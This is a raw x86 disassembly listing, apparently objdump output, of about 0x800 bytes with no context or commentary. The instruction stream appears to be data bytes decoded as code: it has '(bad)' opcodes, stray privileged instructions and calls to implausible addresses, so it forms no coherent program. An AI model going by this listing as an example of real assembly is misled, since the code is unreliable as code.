  402eaf:	xor    BYTE PTR [eax],0x4
  402eb2:	inc    edx
  402eb3:	push   eax
  402eb4:	and    BYTE PTR [eax],dl
  402eb6:	test   BYTE PTR [eax+0x3],cl
  402eb9:	mov    DWORD PTR [ecx-0x67ff7e1f],esp
  402ebf:	cs pusha 
  402ec1:	and    BYTE PTR [eax+eax*1],ch
  402ec4:	and    BYTE PTR [ecx],al
  402ec6:	inc    eax
  402ec7:	xor    BYTE PTR es:[eax-0x3f],al
  402ecb:	and    BYTE PTR [eax],dl
  402ecd:	add    eax,DWORD PTR [eax]
  402ecf:	adc    BYTE PTR [edx],dl
  402ed1:	push   cs
  402ed2:	adc    BYTE PTR [edx+0x4],dl
  402ed5:	rol    BYTE PTR ds:0x58028241,0x11
  402edc:	add    BYTE PTR [esi],ch
  402ede:	and    dl,BYTE PTR [eax+0x1a]
  402ee1:	add    BYTE PTR [eax],0xe
  402ee4:	cmp    al,BYTE PTR [esi]
  402ee6:	mov    al,0x31
  402ee8:	test   BYTE PTR [esi],ch
  402eea:	mov    BYTE PTR [eax],ah
  402eec:	mov    al,ds:0x41010e0a
  402ef1:	add    BYTE PTR [edi],al
  402ef3:	or     al,0x58
  402ef5:	or     esi,DWORD PTR [eax-0x655a7cc0]
  402efb:	or     eax,0x50624504
  402f00:	add    al,0xa3
  402f02:	dec    ebx
  402f03:	ins    DWORD PTR es:[edi],dx
  402f04:	pusha  
  402f05:	or     BYTE PTR [eax+0x43a18b80],cl
  402f0b:	pusha  
  402f0c:	dec    edx
  402f0d:	xor    BYTE PTR [ecx-0x18],0xc6
  402f11:	xchg   ecx,eax
  402f12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f13:	adc    BYTE PTR [edx+ecx*1],al
  402f16:	adc    al,0x2
  402f18:	leave  
  402f19:	add    BYTE PTR [edx],al
  402f1b:	or     eax,DWORD PTR [eax]
  402f1d:	fiadd  WORD PTR [ecx+eiz*4+0x4088e070]
  402f24:	aam    0xc0
  402f26:	push   es
  402f27:	dec    eax
  402f28:	and    BYTE PTR [ecx+0x60000614],bl
  402f2e:	jb     0x402f69
  402f30:	add    BYTE PTR fs:[eax],al
  402f33:	xor    BYTE PTR [ebp+0x240ea62],dh
  402f39:	xor    BYTE PTR [ebx],al
  402f3b:	xor    BYTE PTR [eax+0x0],al
  402f3e:	jb     0x402f42
  402f40:	and    al,0x0
  402f42:	adc    BYTE PTR [eax],0x5
  402f45:	inc    eax
  402f46:	xor    BYTE PTR [ecx],ah
  402f48:	add    DWORD PTR [edx],edx
  402f4a:	retf   
  402f4b:	and    DWORD PTR ds:0x40180446,0x0
  402f52:	call   DWORD PTR ds:0x44a2a4
  402f58:	and    BYTE PTR [eax-0x6fdffacd],dl
  402f5e:	push   es
  402f5f:	add    DWORD PTR [edx],esp
  402f61:	xor    BYTE PTR [eax],bl
  402f63:	push   es
  402f64:	and    eax,0x842044a2
  402f69:	or     BYTE PTR [ecx+ecx*2],cl
  402f6c:	add    al,0x0
  402f6e:	xor    BYTE PTR [eax],al
  402f70:	and    BYTE PTR [edx+0x50],al
  402f73:	cdq    
  402f74:	and    DWORD PTR ds:0x2a620a20,eax
  402f7a:	adc    edx,esp
  402f7c:	add    BYTE PTR [edx],0x18
  402f7f:	add    eax,0x388
  402f84:	add    BYTE PTR [ebp+0x28],al
  402f87:	push   0x21002002
  402f8c:	add    ch,BYTE PTR [eax]
  402f8e:	and    DWORD PTR [ebp+0x26104],esi
  402f94:	add    BYTE PTR [eax],ah
  402f96:	and    ah,BYTE PTR [edx+0x10]
  402f99:	xor    esp,DWORD PTR [ebp+0x30]
  402f9c:	add    DWORD PTR [ecx+eiz*1],edi
  402f9f:	add    al,0x83
  402fa2:	sub    BYTE PTR [eax],al
  402fa4:	mov    al,ds:0x204301c
  402fa9:	add    BYTE PTR [ecx+0xd00001e],dh
  402faf:	xor    BYTE PTR [edx-0x60],dh
  402fb2:	pop    eax
  402fb3:	or     DWORD PTR [ecx],esi
  402fb5:	or     DWORD PTR [eax+0x24],ebx
  402fb8:	and    al,0xc4
  402fba:	add    al,BYTE PTR [eax]
  402fbc:	in     al,0x8
  402fbe:	lea    eax,[ecx+0x40210004]
  402fc4:	add    al,0x10
  402fc6:	add    bl,BYTE PTR [ebp+0x46001804]
  402fcc:	pusha  
  402fcd:	and    BYTE PTR [esi+0xa411216],dl
  402fd3:	adc    DWORD PTR [ecx+0xc428881],eax
  402fd9:	add    dl,BYTE PTR [eax+0x48]
  402fdc:	add    BYTE PTR [eax],0x22
  402fdf:	pop    ds
  402fe0:	adc    eax,0x8400a0e7
  402fe5:	xor    edx,edx
  402fe7:	sbb    al,0x10
  402fe9:	inc    eax
  402fea:	add    BYTE PTR [eax-0x7c],al
  402fed:	add    BYTE PTR [eax],0xf1
  402ff0:	adc    al,BYTE PTR [eax]
  402ff2:	adc    BYTE PTR [esp+eax*1],al
  402ff5:	popa   
  402ff6:	and    BYTE PTR [edx],dl
  402ff8:	add    DWORD PTR [eax+0x16],ebx
  402ffb:	mov    DWORD PTR [eax],esi
  402ffd:	add    BYTE PTR [ecx-0x7cfb5b40],al
  403003:	add    al,0x96
  403005:	add    BYTE PTR [eax],ah
  403007:	mov    BYTE PTR [eax],dh
  403009:	pop    es
  40300a:	add    DWORD PTR [ecx+0x4424019],0x406a6808
  403014:	sub    al,0x14
  403016:	add    ah,dh
  403018:	add    BYTE PTR [eax-0x55fb7760],al
  40301e:	add    BYTE PTR [eax],dl
  403020:	aam    0x10
  403022:	push   edx
  403023:	dec    eax
  403024:	add    bh,BYTE PTR ss:[eax+0xb0]
  40302b:	test   BYTE PTR [ecx],al
  40302d:	adc    DWORD PTR [edx-0x5ef96ffa],esp
  403033:	sub    eax,DWORD PTR [eax+0x401b2380]
  403039:	inc    edx
  40303a:	add    BYTE PTR [ecx],al
  40303c:	and    al,0x2
  40303e:	inc    eax
  40303f:	inc    ebp
  403040:	xor    BYTE PTR [eax],0xc
  403043:	push   esp
  403044:	or     dh,ah
  403046:	add    BYTE PTR [ecx],ah
  403048:	and    BYTE PTR [eax],al
  40304a:	mov    esi,DWORD PTR [ecx+0x4a]
  40304d:	or     BYTE PTR [edi],0x44
  403050:	xor    BYTE PTR [ecx],ch
  403052:	inc    eax
  403053:	or     BYTE PTR [edx+0x40],al
  403056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403057:	add    BYTE PTR [ecx-0x3cbee364],al
  40305d:	or     DWORD PTR [eax],ecx
  40305f:	and    BYTE PTR [ecx+0x32a901a],al
  403065:	and    BYTE PTR [edi+0x40],0x49
  403069:	rol    eax,0x1
  40306c:	shl    BYTE PTR [eax],0xa0
  40306f:	and    BYTE PTR [edx+0x23],dl
  403072:	add    BYTE PTR [ecx+0x36b36298],al
  403078:	add    BYTE PTR [esi+ecx*1],cl
  40307b:	inc    edx
  40307c:	push   eax
  40307d:	and    ecx,DWORD PTR ds:0x108c9
  403083:	push   ecx
  403084:	and    BYTE PTR [edx+0x2d045152],al
  40308a:	popa   
  40308b:	sbb    ebp,DWORD PTR [eax]
  40308d:	and    al,BYTE PTR [eax]
  40308f:	call   0x11432395
  403094:	test   BYTE PTR [eax],ch
  403096:	add    DWORD PTR [edi],edx
  403098:	ret    0xa02
  40309b:	inc    esi
  40309c:	mov    ds:0x34bb0288,al
  4030a1:	inc    eax
  4030a2:	add    DWORD PTR [eax+0x116000e8],eax
  4030a8:	and    al,0x88
  4030aa:	or     BYTE PTR es:0x80ca0729,ch
  4030b1:	sub    ah,BYTE PTR es:[ecx]
  4030b4:	adc    DWORD PTR [ebx+0xab08480],ecx
  4030ba:	or     DWORD PTR [ecx],ecx
  4030bc:	add    al,0x41
  4030be:	mov    al,ds:0x86035420
  4030c3:	dec    eax
  4030c4:	cmp    al,bh
  4030c6:	adc    BYTE PTR [eax],al
  4030c8:	sbb    DWORD PTR [ecx+0x0],edi
  4030cb:	add    BYTE PTR [eax-0x30],dl
  4030ce:	adc    BYTE PTR [ecx+0x42244454],al
  4030d4:	mov    eax,ss
  4030d6:	loop   0x4030d8
  4030d8:	add    BYTE PTR [ecx+0x4a000402],0x38
  4030df:	pusha  
  4030e0:	inc    eax
  4030e1:	push   0x1
  4030e3:	inc    edx
  4030e4:	pop    es
  4030e5:	sbb    BYTE PTR [edx-0x7e7fc600],al
  4030eb:	add    al,0x7
  4030ed:	and    ah,BYTE PTR [eax]
  4030ef:	add    DWORD PTR [ebx],edi
  4030f1:	pusha  
  4030f2:	and    BYTE PTR [eax-0x765bd740],bl
  4030f8:	add    DWORD PTR [eax+0x59040d02],0x160e2220
  403102:	and    al,0x23
  403104:	add    dl,dl
  403106:	mov    BYTE PTR [ecx+0x10040cc6],al
  40310c:	pop    ecx
  40310d:	cdq    
  40310e:	add    DWORD PTR [ebx],eax
  403110:	mov    WORD PTR [eax+eax*4],fs
  403113:	inc    esi
  403114:	or     al,BYTE PTR [eax-0x3f7efbf0]
  40311a:	dec    edi
  40311b:	or     DWORD PTR [eax],eax
  40311d:	and    DWORD PTR [eax+0x60000c68],eax
  403123:	add    BYTE PTR [eax],cl
  403125:	add    ebp,edx
  403127:	add    ah,BYTE PTR [esp+ebp*4]
  40312a:	rol    BYTE PTR [eax*4+0x7480211],0x12
  403132:	xchg   esp,eax
  403133:	adc    BYTE PTR [edi],ah
  403135:	add    eax,0xa022122
  40313a:	inc    eax
  40313b:	inc    eax
  40313c:	or     BYTE PTR gs:[eax+0x8],dl
  403140:	add    BYTE PTR [eax],dl
  403142:	jo     0x403145
  403144:	xchg   ecx,eax
  403145:	add    al,0x19
  403147:	add    DWORD PTR [eax],ebp
  403149:	adc    BYTE PTR [eax],bl
  40314b:	add    DWORD PTR [eax+0x2b6099a],0x2080a420
  403155:	cmp    cl,BYTE PTR [eax-0x1cf71b34]
  40315b:	or     eax,DWORD PTR [ecx]
  40315d:	xor    DWORD PTR [ecx],eax
  40315f:	shl    DWORD PTR [edx],0x50
  403162:	push   eax
  403163:	push   cs
  403164:	or     BYTE PTR [eax],0xbc
  403167:	add    BYTE PTR [eax+0x220a4cc1],al
  40316d:	adc    BYTE PTR [eax-0x6b9fcf70],bl
  403173:	rcr    BYTE PTR [eax],cl
  403175:	add    BYTE PTR [eax],0x83
  403178:	mov    al,ds:0x41384c12
  40317d:	add    BYTE PTR [eax+edx*1],0x8
  403181:	adc    eax,0x200a209a
  403186:	inc    edx
  403187:	add    BYTE PTR [eax],al
  403189:	add    al,0xe
  40318b:	add    al,0x14
  40318d:	push   edx
  40318e:	or     DWORD PTR [ecx],eax
  403190:	or     al,0x0
  403192:	add    BYTE PTR [eax],dh
  403194:	and    BYTE PTR [edx-0x50],bl
  403197:	or     BYTE PTR [edx],ah
  403199:	sbb    al,BYTE PTR [edx]
  40319b:	inc    esp
  40319c:	inc    eax
  40319d:	add    DWORD PTR [ebx+eax*1],eax
  4031a0:	or     eax,DWORD PTR [ebp+eax*1+0x30]
  4031a4:	push   ecx
  4031a5:	mov    ds:0x40f015,eax
  4031aa:	jmp    0xe0e1:0x3b880c01
  4031b1:	add    BYTE PTR [edi+eax*2+0x40],al
  4031b5:	leave  
  4031b6:	stc    
  4031b7:	or     al,0x43
  4031b9:	inc    eax
  4031ba:	xchg   ebx,eax
  4031bb:	and    BYTE PTR [esp+esi*1+0x8d1821],cl
  4031c2:	pusha  
  4031c3:	add    eax,0x2260000
  4031c8:	inc    eax
  4031c9:	push   edx
  4031ca:	and    BYTE PTR [esi+0x40],al
  4031cd:	pusha  
  4031ce:	push   cs
  4031cf:	push   0x18385242
  4031d4:	mov    WORD PTR [ecx],?
  4031d6:	add    ah,BYTE PTR [ecx]
  4031d8:	add    al,0xa8
  4031da:	add    BYTE PTR [ecx+edx*1],al
  4031dd:	dec    edx
  4031de:	or     DWORD PTR [ecx],eax
  4031e0:	push   esi
  4031e1:	adc    DWORD PTR [esi],eax
  4031e3:	push   esp
  4031e4:	add    DWORD PTR [ebp+0x44a03142],ecx
  4031ea:	inc    eax
  4031eb:	inc    eax
  4031ec:	pop    edi
  4031ed:	push   ss
  4031ee:	enter  0x400,0x53
  4031f2:	pop    esp
  4031f3:	add    eax,eax
  4031f5:	add    al,0x50
  4031f7:	inc    edi
  4031f8:	and    DWORD PTR [ebx],eax
  4031fa:	and    eax,DWORD PTR [ecx]
  4031fc:	pusha  
  4031fd:	mov    al,ds:0x3910a028
  403202:	js     0x4031c6
  403204:	mov    BYTE PTR [eax+ebx*1-0x7bddec7f],dh
  40320b:	add    eax,0x40025aa2
  403210:	imul   esp,DWORD PTR [eax],0x54
  403213:	or     al,0x1e
  403215:	add    al,0x2
  403217:	add    BYTE PTR [ecx],al
  403219:	add    al,0x4
  40321b:	push   es
  40321c:	or     DWORD PTR [eax],ecx
  40321e:	add    esp,DWORD PTR [edx]
  403220:	and    al,0xb
  403222:	or     al,0x6
  403224:	or     DWORD PTR [eax],eax
  403226:	inc    eax
  403227:	add    BYTE PTR [ecx],al
  403229:	lods   eax,DWORD PTR ds:[esi]
  40322a:	add    BYTE PTR [esi-0x80],al
  40322d:	and    BYTE PTR [ebx+0x3b],dl
  403230:	add    esp,DWORD PTR [edx+eax*1]
  403233:	add    BYTE PTR [eax+0x1018b0ce],al
  403239:	adc    BYTE PTR [ecx],al
  40323b:	or     eax,esp
  40323d:	or     ah,dh
  40323f:	or     BYTE PTR [ebx-0x7afbff70],0x0
  403246:	nop
  403247:	add    BYTE PTR [eax+0x11124b],dh
  40324d:	add    BYTE PTR [eax],dl
  40324f:	adc    DWORD PTR [eax],ebx
  403251:	sbb    ch,BYTE PTR [esp+eiz*8]
  403254:	add    al,BYTE PTR [eax+0x9]
  403257:	inc    esp
  403258:	mov    al,0x20
  40325a:	inc    eax
  40325b:	inc    edx
  40325c:	sub    al,0x6
  40325e:	adc    bl,0x13
  403261:	retw   0x50e
  403265:	adc    BYTE PTR [edi+0x2],ah
  403268:	inc    ecx
  403269:	add    BYTE PTR [ecx],0x3
  40326c:	sbb    eax,DWORD PTR [eax]
  40326e:	sbb    DWORD PTR [edx*1+0x52060881],esi
  403275:	ins    BYTE PTR es:[edi],dx
  403276:	mov    eax,ds:0xa391000
  40327b:	sbb    BYTE PTR [eax],al
  40327d:	adc    BYTE PTR [eax+eax*2+0x44a0458],ch
  403284:	and    esi,DWORD PTR [edx]
  403286:	add    al,0x1
  403288:	add    BYTE PTR ds:0x8e0c8,cl
  40328e:	and    BYTE PTR [ecx+0x4802604],dl
  403294:	sub    BYTE PTR [eax+0x882880],0x20
  40329b:	add    BYTE PTR [eax],al
  40329d:	shl    DWORD PTR [eax],1
  40329f:	push   eax
  4032a0:	inc    ecx
  4032a1:	add    BYTE PTR [esi-0x6dfbff2f],cl
  4032a7:	push   ss
  4032a8:	add    dl,BYTE PTR [ebp-0x5df7bf5f]
  4032ae:	mov    eax,ds:0x10900022
  4032b3:	sub    al,BYTE PTR [ecx]
  4032b5:	or     BYTE PTR [ecx+0x1040b182],bh
  4032bb:	inc    eax
  4032bc:	or     BYTE PTR [eax],al
  4032be:	add    al,0x22
  4032c0:	inc    edx
  4032c1:	push   es
  4032c2:	nop
  4032c3:	push   es
  4032c4:	adc    eax,0x4920c180
  4032c9:	test   BYTE PTR [ecx+0x40],al
  4032cc:	add    eax,0xa20811c
  4032d1:	mov    dl,0x20
  4032d3:	enter  0x8380,0x42
  4032d7:	rol    BYTE PTR [eax],0x80
  4032da:	fisub  WORD PTR [eax+ecx*1]
  4032dd:	mov    eax,ds:0x107b920e
  4032e2:	adc    eax,DWORD PTR [eax+0x420012c2]
  4032e8:	fwait
  4032e9:	bound  esp,QWORD PTR [ecx]
  4032eb:	stos   BYTE PTR es:[edi],al
  4032ec:	mov    BYTE PTR es:[ebx],dh
  4032ef:	xchg   edx,eax
  4032f0:	test   BYTE PTR [eax],cl
  4032f2:	xor    al,al
  4032f4:	cmp    BYTE PTR [eax+0x4589892],0x4c
  4032fb:	add    BYTE PTR [eax],dh
  4032fd:	add    BYTE PTR [ebx+0xc0472a4],dh
  403303:	and    BYTE PTR ss:[eax-0x5fbe4000],0x14
  40330b:	sub    BYTE PTR [ecx],al
  40330d:	inc    eax
  40330e:	dec    esp
  40330f:	add    DWORD PTR [ecx],esp
  403311:	xchg   esp,eax
  403312:	sub    BYTE PTR [ecx-0x7dfdfd7d],al
  403318:	inc    ebp
  403319:	pop    es
  40331a:	inc    eax
  40331b:	or     DWORD PTR [ebp+0x0],0x40
  40331f:	adc    BYTE PTR [eax-0x74],al
  403322:	mov    al,ds:0x4188988
  403327:	les    esp,FWORD PTR [eax+0x9]
  40332a:	dec    ecx
  40332b:	mov    dl,0x3
  40332d:	adc    BYTE PTR [edx],al
  40332f:	rcl    BYTE PTR [ecx],1
  403331:	inc    eax
  403332:	dec    ebp
  403333:	inc    ecx
  403334:	sbb    al,0xe
  403336:	add    BYTE PTR [edx+0x7000001e],bl
  40333c:	cwde   
  40333d:	adc    BYTE PTR [ecx],al
  40333f:	add    al,BYTE PTR [eax]
  403341:	sub    al,BYTE PTR [esp+eax*1+0x140a06]
  403348:	add    BYTE PTR [ecx],al
  40334a:	add    BYTE PTR [edx+0x0],al
  40334d:	add    BYTE PTR [ebx-0x7fe7f0e4],bh
  403353:	add    cl,BYTE PTR [ecx]
  403355:	jne    0x4033b8
  403357:	mov    al,ds:0x20280858
  40335c:	inc    eax
  40335d:	pop    eax
  40335e:	and    BYTE PTR [eax],ch
  403360:	add    eax,0x4710ea21
  403365:	add    BYTE PTR [eax+0x2711aab1],al
  40336b:	inc    edx
  40336c:	and    al,0x28
  40336e:	xor    BYTE PTR [eax+0x43041c0],al
  403374:	add    al,0x89
  403376:	or     DWORD PTR [eax-0x5beee75f],edx
  40337c:	push   es
  40337d:	popa   
  40337e:	add    BYTE PTR [edx],al
  403380:	mov    al,ds:0x310004a1
  403385:	mov    al,ds:0x852013
  40338a:	adc    DWORD PTR [ecx],eax
  40338c:	inc    esp
  40338d:	sbb    BYTE PTR [eax+0x40040191],al
  403393:	add    BYTE PTR [ecx],ah
  403395:	xor    cl,al
  403397:	add    al,0xa
  403399:	mov    al,ds:0x8508400
  40339e:	xor    BYTE PTR [edx-0x5eafbdcc],al
  4033a4:	or     BYTE PTR [ebx+0x24],cl
  4033a7:	add    ah,BYTE PTR [edx]
  4033a9:	cmp    al,BYTE PTR [eax+eiz*4]
  4033ac:	and    DWORD PTR [ecx+0x16],esp
  4033af:	adc    BYTE PTR [ecx+ebp*1+0x11],al
  4033b3:	pop    eax
  4033b4:	and    BYTE PTR [eax],0x0
  4033b7:	lea    esp,[esp+ebx*1]
  4033ba:	add    BYTE PTR [eax],ah
  4033bc:	or     ecx,DWORD PTR [eax]
  4033be:	inc    eax
  4033bf:	or     DWORD PTR [esi],ecx
  4033c1:	adc    eax,0x80851
  4033c6:	popa   
  4033c7:	adc    BYTE PTR [eax+0x1002850],al
  4033cd:	xchg   edx,eax
  4033ce:	test   bl,0x7
  4033d1:	push   es
  4033d2:	add    al,al
  4033d4:	je     0x4033d6
  4033d6:	add    BYTE PTR [ecx],al
  4033d8:	pusha  
  4033d9:	or     DWORD PTR [edx+eax*1+0x3],eax
  4033dd:	add    BYTE PTR [edx+eiz*1-0x74],al
  4033e1:	push   cs
  4033e2:	adc    BYTE PTR [ecx-0x7e9fe740],al
  4033e8:	sbb    al,0x4
  4033ea:	pusha  
  4033eb:	push   es
  4033ec:	add    BYTE PTR [eax+ecx*4+0x2ad11494],dl
  4033f3:	add    BYTE PTR [eax],ah
  4033f5:	add    BYTE PTR [eax+eiz*1],0x80
  4033f9:	or     al,0x48
  4033fb:	add    DWORD PTR [ebx],edx
  4033fd:	add    BYTE PTR [esi],cl
  4033ff:	sbb    BYTE PTR [eax-0x1e],dh
  403402:	sub    DWORD PTR [eax+0x1],ecx
  403405:	xchg   DWORD PTR [eax+0x40],eax
  403408:	inc    eax
  403409:	xor    BYTE PTR [eax],ah
  40340b:	dec    ecx
  40340c:	or     BYTE PTR [eax],0x88
  40340f:	and    DWORD PTR [eax-0x5ff76000],edx
  403415:	and    BYTE PTR [edx],al
  403417:	or     BYTE PTR [edx+0x62],al
  40341a:	and    al,0x8
  40341c:	add    dl,BYTE PTR [edx+0x30]
  40341f:	adc    BYTE PTR [ebx],0x10
  403422:	dec    esp
  403423:	and    ah,BYTE PTR [eax+ecx*1+0xd0412c8]
  40342a:	add    BYTE PTR [eax+0x10c8241],dh
  403430:	and    BYTE PTR [eax],ah
  403432:	inc    ebp
  403433:	or     BYTE PTR [edx],dl
  403435:	or     BYTE PTR [ecx+0x79982080],ah
  40343b:	test   BYTE PTR [ecx],cl
  40343d:	adc    BYTE PTR [ecx+0x20],cl
  403440:	nop
  403441:	and    BYTE PTR [ebp-0x80],al
  403444:	inc    eax
  403445:	adc    BYTE PTR [ebx+0x594025e],al
  40344b:	xor    al,BYTE PTR [eax]
  40344d:	or     eax,DWORD PTR [eax]
  40344f:	add    cl,al
  403451:	inc    ecx
  403452:	or     BYTE PTR [edx],ch
  403454:	adc    DWORD PTR [eax],eax
  403456:	adc    cl,BYTE PTR [ecx+0x62]
  403459:	clc    
  40345a:	add    al,BYTE PTR [edx+0x49]
  40345d:	add    BYTE PTR [ecx],al
  40345f:	or     al,0xc
  403461:	loop   0x40348b
  403463:	add    edx,DWORD PTR [edx+ebx*2+0x8024608]
  40346a:	(bad)  
  40346b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40346c:	cmp    BYTE PTR [edx],al
  40346e:	and    BYTE PTR [ecx+0x2c],dl
  403471:	dec    esi
  403472:	mov    BYTE PTR [eax-0x5cbf7840],cl
  403478:	mov    eax,DWORD PTR fs:[eax]
  40347b:	push   eax
  40347c:	push   eax
  40347d:	add    eax,0x43c4848
  403482:	adc    BYTE PTR [eax+ebx*1],bl
  403485:	loopne 0x403407
  403487:	inc    ecx
  403488:	sub    DWORD PTR [ecx],edx
  40348a:	or     BYTE PTR [eax+0x0],dl
  40348d:	add    al,0xc2
  40348f:	push   ecx
  403490:	mov    BYTE PTR [eax],0x41
  403493:	sldt   WORD PTR [ecx+0x2058c004]
  40349a:	aad    0xa
  40349c:	inc    ecx
  40349d:	and    al,0xc9
  40349f:	add    dl,BYTE PTR [eax]
  4034a1:	mov    al,ds:0x28030a0
  4034a6:	and    bl,BYTE PTR [eax]
  4034a8:	and    BYTE PTR [ebx],0x1
  4034ab:	add    BYTE PTR [eax],dh
  4034ad:	and    BYTE PTR [ecx],cl
  4034af:	push   es
  4034b0:	rol    BYTE PTR [ebp+0x44],0x52
  4034b4:	cs or  al,0x1
  4034b7:	mov    al,ds:0xe64012
  4034bc:	mov    DWORD PTR [eax],ebp
  4034be:	rol    BYTE PTR [ecx],1
  4034c0:	xchg   ebx,eax
  4034c1:	adc    DWORD PTR [edx],eax
  4034c3:	and    al,0xa
  4034c5:	sub    ah,BYTE PTR [edx+0x2200d08]
  4034cb:	add    eax,0xb3000099
  4034d0:	add    eax,DWORD PTR [eax+0xc0020d1]
  4034d6:	and    al,0x18
  4034d8:	mov    BYTE PTR [eax],al
  4034da:	sbb    al,0x90
  4034dc:	xor    BYTE PTR [esi],al
  4034de:	adc    BYTE PTR [ebx],dl
  4034e0:	cwde   
  4034e1:	push   0x50c19188
  4034e6:	push   cs
  4034e7:	adc    al,0x0
  4034e9:	or     ch,BYTE PTR [eax]
  4034eb:	int3   
  4034ec:	add    BYTE PTR [eax],al
  4034ee:	call   0x53ca35f5
  4034f3:	dec    edx
  4034f4:	xchg   BYTE PTR [edx+0x20],cl
  4034f7:	adc    al,0x10
  4034f9:	pop    ecx
  4034fa:	and    al,0x11
  4034fc:	and    BYTE PTR [edx+0x40],ah
  4034ff:	push   ecx
  403500:	and    al,BYTE PTR [edx]
  403502:	adc    DWORD PTR [ecx+eax*1+0x1060531],eax
  403509:	inc    edx
  40350a:	nop
  40350b:	mov    al,ds:0x82498083
  403510:	add    BYTE PTR [eax],ah
  403512:	and    BYTE PTR [eax],dl
  403514:	or     DWORD PTR [eax],eax
  403516:	xor    DWORD PTR [edx],ecx
  403518:	or     BYTE PTR [ebp+0x10800003],0xa4
  40351f:	mov    BYTE PTR [edx+edx*1],al
  403522:	adc    al,al
  403524:	sub    BYTE PTR [ecx+0x2130ac41],0x0
  40352b:	add    ah,dl
  40352d:	or     eax,0x80c21019
  403532:	add    BYTE PTR [edx],dl
  403534:	inc    eax
  403535:	xchg   esi,eax
  403536:	xor    BYTE PTR [eax-0x7997fde0],0x8
  40353d:	xchg   esp,eax
  40353e:	push   eax
  40353f:	or     DWORD PTR [ebx+0x20090270],ecx
  403545:	mov    al,ds:0x90301a08
  40354a:	mov    al,ds:0x332310d0
  40354f:	or     eax,eax
  403551:	test   BYTE PTR [edi+0x0],al
  403554:	add    BYTE PTR [eax+eax*1],ah
  403557:	and    cl,BYTE PTR [eax+0x900208]
  40355d:	cmp    ah,BYTE PTR [ecx]
  40355f:	fmul   DWORD PTR [eax]
  403561:	add    DWORD PTR [ecx],esp
  403563:	rol    BYTE PTR [ebp+eax*4+0x49618e10],0x7
  40356b:	sbb    BYTE PTR [ecx],dl
  40356d:	or     BYTE PTR [eax],al
  40356f:	push   ecx
  403570:	add    BYTE PTR [eax+0x44082880],ah
  403576:	add    bl,BYTE PTR ds:0x10a0081b
  40357c:	add    DWORD PTR [eax],eax
  40357e:	cmp    BYTE PTR [ebx+edx*1],al
  403581:	xor    BYTE PTR [esi],al
  403583:	add    BYTE PTR [ecx],0xe9
  403586:	or     eax,0x860210a7
  40358b:	sbb    BYTE PTR [edx+0x2120c501],cl
  403591:	and    BYTE PTR [edx],dl
  403593:	adc    al,BYTE PTR [esp+eax*1+0x9]
  403597:	inc    eax
  403598:	sbb    BYTE PTR [ecx],cl
  40359a:	inc    esp
  40359b:	mov    al,0x78
  40359d:	add    BYTE PTR [eax+0x2],dl
  4035a0:	or     cl,BYTE PTR [eax+0x1020610]
  4035a6:	loop   0x4035de
  4035a8:	call   0x6686df4d
  4035ad:	add    BYTE PTR [eax],cl
  4035af:	and    dh,BYTE PTR [eax+0x4d000e07]
  4035b5:	sbb    dl,BYTE PTR [eax]
  4035b7:	or     BYTE PTR [ecx],ah
  4035b9:	add    BYTE PTR [ecx],al
  4035bb:	and    eax,0x201d0105
  4035c0:	add    BYTE PTR gs:[eax],al
  4035c3:	pop    es
  4035c4:	push   0x41a302
  4035c9:	mov    cl,0x66
  4035cb:	mov    al,ds:0x201521
  4035d0:	(bad)  
  4035d1:	rcl    BYTE PTR [eax+0x0],0xa0
  4035d5:	lds    eax,FWORD PTR [ecx]
  4035d7:	lods   al,BYTE PTR ds:[esi]
  4035d8:	les    eax,FWORD PTR [ecx]
  4035da:	dec    edx
  4035db:	adc    BYTE PTR [eax+0x20010088],0x13
  4035e2:	mov    al,ds:0x4200c00
  4035e7:	add    BYTE PTR [eax-0x52],al
  4035ea:	adc    BYTE PTR [eax],dl
  4035ec:	mov    cl,0x26
  4035ee:	add    ecx,eax
  4035f0:	and    DWORD PTR ds:0x400851d0,0x8c000
  4035fa:	mov    DWORD PTR [eax],eax
  4035fc:	test   BYTE PTR [eax+edx*4+0x102008fa],cl
  403603:	in     al,0x80
  403605:	mov    ds:0x4640a3,al
  40360a:	pop    es
  40360b:	test   eax,0x14123900
  403610:	popf   
  403611:	xchg   BYTE PTR [eax-0x7c],al
  403614:	and    BYTE PTR [ecx-0x5c],cl
  403617:	mov    cl,0x2a
  403619:	repnz push 0x6898872
  40361f:	adc    BYTE PTR [eax],cl
  403621:	adc    BYTE PTR [edx+0x0],bl
  403624:	inc    ecx
  403625:	cmp    BYTE PTR [eax+0x54064c],bl
  40362b:	imul   esp,DWORD PTR [eax+0x20420200],0x1
  403632:	dec    eax
  403633:	or     bl,BYTE PTR [eax]
  403635:	mov    al,dl
  403637:	mov    eax,0x48800132
  40363c:	mov    al,0xe4
  40363e:	add    ah,BYTE PTR [ecx]
  403640:	and    DWORD PTR [edx],eax
  403642:	xor    BYTE PTR [edx+ebx*2],al
  403645:	in     al,0x1c
  403647:	add    BYTE PTR [ecx+0x1b08a980],al
  40364d:	inc    eax
  40364e:	popa   
  40364f:	or     dh,BYTE PTR [ecx-0x7e]
  403652:	inc    ebp
  403653:	or     BYTE PTR [eax],dl
  403655:	push   edx
  403656:	pusha  
  403657:	add    al,BYTE PTR [edx]
  403659:	add    BYTE PTR [edx],ah
  40365b:	add    al,0x58
  40365d:	adc    DWORD PTR [eax],0x81028247
  403663:	sub    al,BYTE PTR [ecx]
  403665:	add    BYTE PTR [eax+0x10],cl
  403668:	push   ds
  403669:	add    BYTE PTR [ecx+0x4],ah
  40366c:	add    al,BYTE PTR [eax]
  40366e:	shl    DWORD PTR [eax],0x8
  403671:	inc    ecx
  403672:	sub    BYTE PTR [esi],dh
  403674:	mov    cl,BYTE PTR [ebx+0x6b400a4]
  40367a:	and    BYTE PTR [ecx+0x5a820a50],al
  403680:	ret    0x2102
  403683:	test   BYTE PTR [eax],al
  403685:	add    al,BYTE PTR [eax+eax*1]
  403688:	add    al,0x48
  40368a:	and    al,0x10
  40368c:	add    edx,0x4d28400
  403692:	and    BYTE PTR [eax],dl
  403694:	or     DWORD PTR [eax+0x0],eax
  403697:	pop    eax
  403698:	pusha  
  403699:	add    esp,DWORD PTR [ecx]
  40369b:	adc    al,BYTE PTR [edx]
  40369d:	in     al,0x62
  40369f:	push   esp
  4036a0:	mov    DWORD PTR [ecx+0x2],eax
  4036a3:	add    bh,BYTE PTR [edx]
  4036a5:	sub    BYTE PTR [eax+eax*1],al
  4036a8:	xor    al,0xc0
  4036aa:	adc    BYTE PTR ds:0x4c02071,ah
  4036b0:	adc    DWORD PTR [ecx],eax
